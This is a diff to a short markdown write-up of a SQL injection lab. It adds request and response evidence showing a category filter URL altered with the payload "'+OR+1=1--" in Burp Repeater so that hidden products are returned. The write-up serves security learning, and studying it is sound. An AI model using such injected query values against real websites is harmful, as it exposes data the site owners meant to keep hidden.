@@ -19,5 +19,19 @@ The WHERE condition was bypassed and all products (including hidden ones) were d
 - -- comments out the rest of SQL query
 - Unsanitized input leads to SQL injection
 
-## Result
-Lab successfully solved.
+
+# Request & Response Evidence
+
+##  Original Request
+GET /filter?category=Clothing HTTP/1.1
+
+##  Modified Request (Burp Repeater)
+GET /filter?category=Clothing'+OR+1=1--
+
+##  Response Result
+- All products returned
+- Hidden products became visible
+- SQL query bypass successful
+
+
+
